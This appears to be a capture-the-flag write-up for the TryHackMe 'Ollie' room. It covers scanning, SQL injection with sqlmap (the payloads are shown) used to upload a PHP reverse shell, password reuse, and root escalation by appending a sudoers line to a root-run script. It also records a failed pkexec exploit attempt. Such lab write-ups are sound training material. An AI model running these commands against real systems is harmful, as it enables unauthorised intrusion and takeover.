## Ollie
https://tryhackme.com/room/ollie

### Enum
```
nmap -sC -sV 10.10.141.222 -T 4 -p-
```
```
Scanning 10.10.141.222 [65535 ports]
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5+l/iCTR0Sqa4q0dIntXiVyRE5hsnPV5UfG4D+sQKeM4XoG7mzycPzJxn9WkONCwgmLWyFD1wHOnexqtxEOoyCrHhP2xGz+5sOsJ7RbpA0KL/CAUKs2aCtonKUwg5FEhOjUy945M0e/DmstbOYx8od6603eb4TytHfxQHPPiWBBRCmg6e+5UjcHLSOqDEzXkDOmmLieiE008fEVrNAmF2J+I4XPJI7Usaf3IzpnaFm3Ca9YvNAr4t8gpDST2uNuRWA9NCMspBFEj/5YQfjOnYx2cSSZHUP3lK8tiwc/RWSk7OBTXYOBncyV4lw8OiyJ1fOhr/2gXTXE/tWQvu1zKWYYafMKRdsH6nuE5nZ0CK3pLHe/nUgIsVPl7sJ3QlqJF7Wd5OmY3e4Py7movqFm/HmW+zjwsXGHnzENC47N+RxV0XTYCxbKzTAZDo5gLMxmsbXWnQmU5GMk0e9sh7HHybmWWkKKYJiOp+3yM9vTPXPiNXBeJmvWa01hoAAi+3OU=
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFL/P1VyyCYVY2aUZcXTLmHkiXGo4/KdJptRP7Wioy78Sb/W/bKDAq3Yl6a6RQW7KlGSbZ84who5gWwVMTSTt2U=
|   256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmTKDYCCJVK6wx0kZdjLd1YZeLryW/qXfKAfzqN/UHv
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /immaolllieeboyyy
| http-title: Ollie :: login
|_Requested resource was http://10.10.141.222/index.php?page=login
|_http-favicon: Unknown favicon MD5: 851615F43921F017A297184922B4FBFD
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?  syn-ack ttl 60
| fingerprint-strings:
|   GetRequest:
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
```
![image](https://user-images.githubusercontent.com/6504854/180604441-7965216e-4adb-4ac2-a713-5170aaeb113d.png)

```
nc ip.thm 1337
```
```
What is your name? test
What's up, Test! It's been a while. What are you here for? 1
Ya' know what? Test. If you can answer a question about me, I might have something for you.


What breed of dog am I? I'll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? bulldog
You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
Please hold on a minute
Ok, I'm back.
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: a*****

                    Password: O*******************

PS: Good luck and next time bring some treats!
```
🏴 I get the credential.

![image](https://user-images.githubusercontent.com/6504854/180604554-201e2a72-86a5-45e2-b71c-9dbf3aec2c5b.png)

![image](https://user-images.githubusercontent.com/6504854/180604603-b977c3ca-7308-4db6-a579-0e72994ff0cb.png)

![image](https://user-images.githubusercontent.com/6504854/180604655-0dc2c96b-21e3-4381-a016-b391c8b1ef35.png)

🏴 loggin and it has SQLi.

https://fluidattacks.com/advisories/mercury/

```
sqlmap -u "http://ip.thm/app/admin/routing/edit-bgp-mapping-search.php" --cookie="phpipam=l6nq6vr7sb92go2rdccqu5rh9s" --data="subnet=1&bgp_id=2" -p subnet --file-dest="/var/www/html/1.php" --file-write="1.php"
```
```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.6#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:49:42 /2022-07-23/

[18:49:42] [INFO] resuming back-end DBMS 'mysql'
[18:49:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: subnet (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: subnet=-5721" OR 6409=6409#&bgp_id=2

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: subnet=1" AND GTID_SUBSET(CONCAT(0x71626a6a71,(SELECT (ELT(7401=7401,1))),0x7178707871),7401)-- EocL&bgp_id=2

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: subnet=1";SELECT SLEEP(5)#&bgp_id=2

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: subnet=1" AND (SELECT 5140 FROM (SELECT(SLEEP(5)))MlMh)-- qhCV&bgp_id=2

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: subnet=1" UNION ALL SELECT NULL,NULL,CONCAT(0x71626a6a71,0x56594a716e57456e4c71464561486642574154774a616978566744624272585946514f4a5057514e,0x7178707871),NULL#&bgp_id=2
---
[18:49:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[18:49:44] [INFO] fingerprinting the back-end DBMS operating system
[18:49:44] [INFO] the back-end DBMS operating system is Linux
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[18:49:58] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want confirmation that the local file '1.php' has been successfully written on the back-end DBMS file system ('/var/www/html/1.php')? [Y/n] Y
[18:50:24] [INFO] the local file '1.php' and the remote file '/var/www/html/1.php' have the same size (2357 B)
[18:50:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/ip.thm'

[*] ending @ 18:50:25 /2022-07-23/
```
🏴 I upload rev-shell via SqlMap.(I couldn't have --os-shell)

```
nc -lnvp 4444
```

```
curl http://10.10.141.222/1.php
```

```
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.141.222] 60840
Linux hackerdog 5.4.0-99-generic #112-Ubuntu SMP Thu Feb 3 13:50:55 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 09:54:16 up 44 min,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

### Flag

```
su ollie
Password:
```
🏴 Ollie uses the same pass,lucky!

```
chmod +x ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░


CMD: UID=0    PID=4778   | (feedme)
```

```
find / -name '(feedme)' 2>/dev/null
find / -name feedme 2>/dev/null
/usr/bin/feedme
```

```
cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```

```
echo 'echo "ollie ALL=(ALL:ALL) ALL" >> /etc/sudoers' | tee -a /usr/bin/feedme
```

```
cat /usr/bin/feedme
#!/bin/bash

# This is weird?
echo "ollie ALL=(ALL:ALL) ALL" >> /etc/sudoers
```
🏴 OK

```
sudo
[sudo] password for ollie: 
root@hackerdog:/# cat /root/root.txt
```

### Omake
```
ls -la pkexec
-rwsr-xr-x 1 root root 31032 Jan 12  2022 pkexec
```
🤓

```
$ ./cve-2021-4034
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
```
🏴 Already patched and I couldn't use polkit this time 😢 
（たすかにlinpeasも空振りだったわ）

🐶🐶Thank you for your time! Happy Hacking! 🐶🐶
